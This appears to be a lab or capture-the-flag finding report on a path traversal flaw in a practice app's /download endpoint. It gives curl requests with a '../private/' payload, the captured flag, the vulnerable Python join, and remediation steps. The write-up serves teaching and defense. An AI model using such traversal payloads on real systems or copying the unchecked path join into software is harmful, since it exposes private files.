# Finding 5 — Path Traversal (directory traversal)

- **Class:** Path Traversal (CWE-22) — OWASP A01:2021 — Broken Access Control
- **Endpoint:** `GET /download?file=<name>`
- **Severity:** High — reads files outside the intended `public/` directory.
- **Flag:** `FLAG{traversal_0f400e8109b6}`

## Request (reproducible)
```bash
# intended use:
curl -s "http://127.0.0.1:5000/download?file=welcome.txt"
# traversal out of public/ into the sibling private/ dir:
curl -s -G --data-urlencode "file=../private/employee_notes.txt" \
  http://127.0.0.1:5000/download
```
Effective URL: `GET /download?file=../private/employee_notes.txt`

## Result (actual)
- Baseline returns `Welcome to Vuln Hub. This file is meant to be downloadable.`
- Traversal returns `200 OK`:
  ```
  CONFIDENTIAL - employees only
  If you can read this through the download endpoint, the path filter failed.
  FLAG{traversal_0f400e8109b6}
  ```

## Why it works
The handler joins user input directly onto the base dir (app.py:321-323):
```python
name = request.args.get("file", "welcome.txt")
path = os.path.join(APP_DIR, "public", name)
open(path)
```
`os.path.join(base, "../private/...")` normalizes to escape `public/`. There is
no check that the resolved path stays inside `public/`, so `../` sequences reach
any readable file the process can open (here the sibling `private/` dir; deeper
traversal could reach other filesystem paths).

## Remediation
- **Resolve and confine** the path: compute `os.path.realpath(path)` and verify
  it is inside the intended base dir (e.g. `os.path.commonpath([base, real]) == base`);
  reject otherwise.
- Strip directory components: use only `os.path.basename(name)`, or serve via a
  vetted helper like `flask.send_from_directory`, which blocks traversal.
- Allowlist filenames / use an id-to-file mapping instead of raw user paths.
